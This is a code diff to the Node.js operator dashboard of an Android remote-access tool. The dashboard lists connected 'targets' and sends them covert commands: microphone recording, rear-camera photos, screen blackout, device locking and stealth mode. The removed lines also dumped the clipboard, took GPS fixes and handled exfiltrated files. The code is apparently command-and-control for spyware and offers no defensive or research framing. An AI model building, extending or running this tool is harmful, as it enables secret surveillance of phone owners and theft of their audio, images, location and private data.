@@ -1,4 +1,3 @@
-process.chdir(__dirname);
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -420,15 +419,14 @@ app.post('/api/rename-device', (req, res) => {
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
-    try {
-        if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
-            return handleCheckin(req, res);
-        }
+    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
+        return handleCheckin(req, res);
+    }
 
-        syncUploadsDirectory();
+    syncUploadsDirectory();
 
-        const deviceList = Array.from(devices.values());
-        const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
+    const deviceList = Array.from(devices.values());
+    const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
 
     let devicesHtml = deviceList.length === 0 ?
         '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
@@ -446,29 +444,6 @@ app.get('/', (req, res) => {
                 statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
             }
 
-            const activeTags = [];
-            if (d.blackout) activeTags.push('<span style="color:var(--neon-green); font-size:0.58rem; background:rgba(57,255,20,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-green);">🕶️ BLACKOUT</span>');
-            if (d.locked) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🔒 LOCKED</span>');
-            if (d.recording) activeTags.push('<span style="color:var(--danger); font-size:0.58rem; background:rgba(255,49,49,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--danger);">🎙️ REC</span>');
-            if (d.flashlight) activeTags.push('<span style="color:var(--neon-yellow); font-size:0.58rem; background:rgba(255,255,0,0.1); padding:2px 5px; border-radius:3px; border:1px solid var(--neon-yellow);">🔦 LIGHT</span>');
-            const indicatorsHtml = activeTags.length > 0 ? `<div style="display:flex; gap:4px; margin-top:4px; flex-wrap:wrap;">${activeTags.join('')}</div>` : '';
-
-            const blackoutStyle = d.blackout ?
-                'background: rgba(57,255,20,0.2); color: var(--neon-green); border-color: var(--neon-green); box-shadow: 0 0 10px var(--neon-green);' :
-                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
-
-            const lockStyle = d.locked ?
-                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger);' :
-                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
-
-            const lightStyle = d.flashlight ?
-                'background: rgba(255,255,0,0.2); color: var(--neon-yellow); border-color: var(--neon-yellow); box-shadow: 0 0 10px var(--neon-yellow);' :
-                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
-
-            const micStyle = d.recording ?
-                'background: rgba(255,49,49,0.2); color: var(--danger); border-color: var(--danger); box-shadow: 0 0 10px var(--danger); animation: pulse 1s infinite;' :
-                'background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3);';
-
             return `
             <tr>
                 <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
@@ -476,7 +451,6 @@ app.get('/', (req, res) => {
                         <span onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
                         <span>${displayName}</span><span style="color:#666; font-size:0.68rem;">${subName}</span>
                     </div>
-                    ${indicatorsHtml}
                 </td>
                 <td style="vertical-align: middle;">${d.model || 'SM-F731W'}</td>
                 <td style="vertical-align: middle;">Android ${d.os || '16'}</td>
@@ -486,17 +460,17 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
                 <td style="vertical-align: middle; white-space: nowrap;">
-                    <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
-                </td>
-                <td style="vertical-align: middle;">
-                    <div style="display: grid; grid-template-columns: repeat(4, auto); gap: 4px; align-items: center;">
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'blackout')" class="btn btn-small" style="${blackoutStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🕶️ BLACKOUT: ${d.blackout ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" style="${lockStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🔒 LOCK: ${d.locked ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" style="${lightStyle} padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; font-weight: bold; white-space: nowrap;">🔦 LIGHT: ${d.flashlight ? 'ON' : 'OFF'}</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">🎙️ MIC</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">📷 PHOTO</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">📋 CLIP</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 6px; font-size: 0.58rem; margin: 0; border-radius: 4px; cursor: pointer; white-space: nowrap;">🛰️ GPS</button>
+                    <div style="display: inline-flex; align-items: center; gap: 6px;">
+                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
+                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
+                            <option value="" disabled selected>⚡ ACTIONS</option>
+                            <option value="mic">🎙️ Record Mic (60s)</option>
+                            <option value="flashlight">🔦 Toggle Flashlight</option>
+                            <option value="blackout">🕶️ Toggle Blackout</option>
+                            <option value="lock">🔒 Toggle Lock</option>
+                            <option value="volume">🔊 Max Vol + Vibrate</option>
+                            <option value="photo">📷 Quick Photo (Rear)</option>
+                        </select>
                     </div>
                 </td>
             </tr>
@@ -562,8 +536,7 @@ app.get('/', (req, res) => {
                             <th>STATUS</th>
                             <th>PROFILE</th>
                             <th>LAST CHECK-IN</th>
-                            <th>UPLINK</th>
-                            <th>TACTICAL CONTROLS</th>
+                            <th>ACTION</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -609,23 +582,6 @@ app.get('/', (req, res) => {
         </div>
     </div>
     <script>
-    function showToast(e, t = "info") {
-      let a = document.getElementById("toast-container");
-      if (!a) {
-        a = document.createElement("div");
-        a.id = "toast-container";
-        a.style.cssText = "position: fixed; bottom: 20px; right: 20px; z-index: 999999; display: flex; flex-direction: column; gap: 10px;";
-        document.body.appendChild(a);
-      }
-      const o = document.createElement("div");
-      const bg = (t === "error") ? "rgba(255,49,49,0.9)" : "rgba(0,242,255,0.9)";
-      const shadow = (t === "error") ? "rgba(255,49,49,0.5)" : "rgba(0,242,255,0.5)";
-      o.style.cssText = "background: " + bg + "; color: #000; padding: 12px 20px; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; font-weight: bold; box-shadow: 0 0 20px " + shadow + "; backdrop-filter: blur(5px); transition: opacity 0.3s;";
-      o.innerText = e;
-      a.appendChild(o);
-      setTimeout(function() { o.style.opacity = "0"; setTimeout(function() { o.remove(); }, 300); }, 3000);
-    }
-
     function renameDevice(deviceId, currentAlias) {
         const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
         if (newName !== null) {
@@ -637,13 +593,12 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    showToast("DEVICE_RENAMED");
-                    setTimeout(() => location.reload(), 1000);
+                    location.reload();
                 } else {
-                    showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
+                    alert('Failed to update name: ' + (data.error || 'Unknown error'));
                 }
             })
-            .catch(err => showToast('Network error updating device name.', "error"));
+            .catch(err => alert('Network error updating device name.'));
         }
     }
 
@@ -665,30 +620,24 @@ app.get('/', (req, res) => {
         } else if (action === 'lock') {
             path = '/ghost/lock';
             label = 'Toggle System Lock';
+        } else if (action === 'volume') {
+            path = '/device/max-volume';
+            label = 'Max Volume & Alarm';
         } else if (action === 'photo') {
             path = '/camera/photo?cam=0';
             label = 'Quick Photo (Rear)';
-        } else if (action === 'stealth') {
-            path = '/stealth/toggle';
-            label = 'Toggle Stealth Mode';
-        } else if (action === 'clipboard') {
-            path = '/clipboard';
-            label = 'Dump Clipboard Buffer';
-        } else if (action === 'gps') {
-            path = '/gps/locate?json=true';
-            label = 'Instant GPS Fix';
         }
 
-        const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
+        const fullUrl = \`/proxy\${path}\${path.includes('?') ? '&' : '?'}deviceId=\${encodeURIComponent(deviceId)}\`;
         fetch(fullUrl)
             .then(r => {
                 if (r.ok) {
-                    showToast('[DISPATCH_SUCCESS] ' + label + ' executed.');
+                    alert(\`[⚡ TACTICAL DISPATCH SUCCESS]\\nCommand "\${label}" dispatched to target.\`);
                 } else {
-                    showToast('Dispatch failed (Status ' + r.status + ')', 'error');
+                    alert(\`[!] Dispatch status \${r.status}\`);
                 }
             })
-            .catch(err => showToast('Network error dispatching command', 'error'));
+            .catch(err => alert('Network error dispatching quick command.'));
     }
 
     function deleteExfil(id) {
@@ -701,13 +650,12 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    showToast("PAYLOAD_DELETED");
-                    setTimeout(() => location.reload(), 1000);
+                    location.reload();
                 } else {
-                    showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
+                    alert('Failed to delete file: ' + (data.error || 'Unknown error'));
                 }
             })
-            .catch(err => showToast('Network error deleting file.', "error"));
+            .catch(err => alert('Network error deleting file.'));
         }
     }
     </script>
@@ -715,9 +663,6 @@ app.get('/', (req, res) => {
 </html>`;
 
     res.send(html);
-    } catch (err) {
-        res.status(500).send('<h1>Internal Server Error</h1><pre>' + err.stack + '</pre>');
-    }
 });
 
 // Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
